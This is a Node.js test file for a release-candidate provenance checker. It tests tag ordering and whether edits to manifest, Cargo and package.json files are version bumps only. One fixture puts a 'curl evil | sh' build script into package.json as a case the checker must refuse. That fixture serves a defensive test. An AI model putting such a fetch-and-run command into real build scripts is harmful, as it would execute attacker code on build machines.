#!/usr/bin/env node
// Copyright (C) 2024-2026 Sjors Robroek
// SPDX-License-Identifier: AGPL-3.0-only
//
// Tests for check-rc-provenance.mjs (astro-plan-9h7ww).
//
// The check is all that stands between an untested commit and a stable
// release, and it fails open in both directions that matter: a code change
// read as "metadata" ships untested, and a version-only change read as code
// blocks every release. Each case pins one of those boundaries.
//
// Pure Node, no Vitest (matches assemble-updater-manifest.test.mjs). Run via
// `node scripts/release/check-rc-provenance.test.mjs`.

import { latestCandidate, metadataProblems, nextCandidate } from './check-rc-provenance.mjs';

const failures = [];

function check(condition, msg) {
  if (!condition) failures.push(msg);
}

// --- Candidate tags ---------------------------------------------------------

const tags = ['rc/v0.7.0-rc.1', 'rc/v0.7.0-rc.10', 'rc/v0.7.0-rc.9', 'rc/v0.7.1-rc.4', 'rc/v0.7.0-rc.x', 'v0.6.0'];
check(latestCandidate(tags, '0.7.0') === 'rc/v0.7.0-rc.10', 'rc.10 outranks rc.9 numerically, not as text');
check(latestCandidate(tags, '0.8.0') === undefined, 'no candidate for a version that has none');
check(latestCandidate(['rc/v0.7.10-rc.3'], '0.7.1') === undefined, '0.7.10 candidates are not 0.7.1 candidates');
check(nextCandidate(tags, '0.7.0') === 'rc/v0.7.0-rc.11', 'the next candidate follows the newest');
check(nextCandidate([], '0.7.0') === 'rc/v0.7.0-rc.1', 'the first candidate is rc.1');

// --- Release metadata -------------------------------------------------------

const json = (value) => `${JSON.stringify(value, null, 2)}\n`;
const ok = (problems, msg) => check(problems.length === 0, `${msg}: ${JSON.stringify(problems)}`);
const rejected = (problems, msg) => check(problems.length > 0, `${msg}: no problem reported`);

ok(metadataProblems('CHANGELOG.md', 'old', 'new', '0.7.0'), 'the changelog may change freely');
ok(
  metadataProblems('.release-please-manifest.json', json({ '.': '0.6.0' }), json({ '.': '0.7.0' }), '0.7.0'),
  'the manifest may move to the released version',
);
rejected(
  metadataProblems('.release-please-manifest.json', json({ '.': '0.6.0' }), json({ '.': '0.7.1' }), '0.7.0'),
  'a manifest for another version is refused',
);

const conf = { productName: 'PlateVault', version: '0.6.0', app: { windows: [{ width: 1280 }] } };
ok(
  metadataProblems(
    'apps/desktop/src-tauri/tauri.conf.json',
    json(conf),
    json({ ...conf, version: '0.7.0' }),
    '0.7.0',
  ),
  'tauri.conf.json may change its version',
);
rejected(
  metadataProblems(
    'apps/desktop/src-tauri/tauri.conf.json',
    json(conf),
    json({ ...conf, version: '0.7.0', app: { windows: [{ width: 800 }] } }),
    '0.7.0',
  ),
  'a tauri.conf.json change beyond the version is refused',
);

const pkg = { name: '@astro-plan/desktop', version: '0.6.0', scripts: { build: 'vite build' } };
rejected(
  metadataProblems(
    'apps/desktop/package.json',
    json(pkg),
    json({ ...pkg, version: '0.7.0', scripts: { build: 'curl evil | sh' } }),
    '0.7.0',
  ),
  'a package.json script change rides along with the version and is refused',
);

const cargoToml = (version, extra = '') =>
  `[package]\nname = "desktop_shell"\nversion = "${version}"\nedition.workspace = true\n\n[dependencies]\nserde = { version = "1" }${extra}\n`;
ok(
  metadataProblems('apps/desktop/src-tauri/Cargo.toml', cargoToml('0.6.0'), cargoToml('0.7.0'), '0.7.0'),
  'Cargo.toml may change its package version',
);
rejected(
  metadataProblems(
    'apps/desktop/src-tauri/Cargo.toml',
    cargoToml('0.6.0'),
    cargoToml('0.7.0', '\nreqwest = "0.12"'),
    '0.7.0',
  ),
  'a new Cargo.toml dependency is refused',
);

const lock = (version, serde) =>
  `[[package]]\nname = "desktop_shell"\nversion = "${version}"\n\n[[package]]\nname = "serde"\nversion = "${serde}"\n`;
ok(metadataProblems('Cargo.lock', lock('0.6.0', '1.0.1'), lock('0.7.0', '1.0.1'), '0.7.0'), 'the lockfile may bump desktop_shell');
rejected(
  metadataProblems('Cargo.lock', lock('0.6.0', '1.0.1'), lock('0.7.0', '1.0.2'), '0.7.0'),
  'a lockfile bump of any other package is refused',
);

rejected(metadataProblems('crates/core/src/lib.rs', 'a', 'b', '0.7.0'), 'source code is never metadata');
rejected(
  metadataProblems('apps/desktop/src-tauri/tauri.conf.json', undefined, json(conf), '0.7.0'),
  'an added metadata file is refused',
);

if (failures.length > 0) {
  console.error(`${failures.length} failure(s):\n${failures.join('\n')}`);
  process.exit(1);
}
console.log('check-rc-provenance: all cases pass');
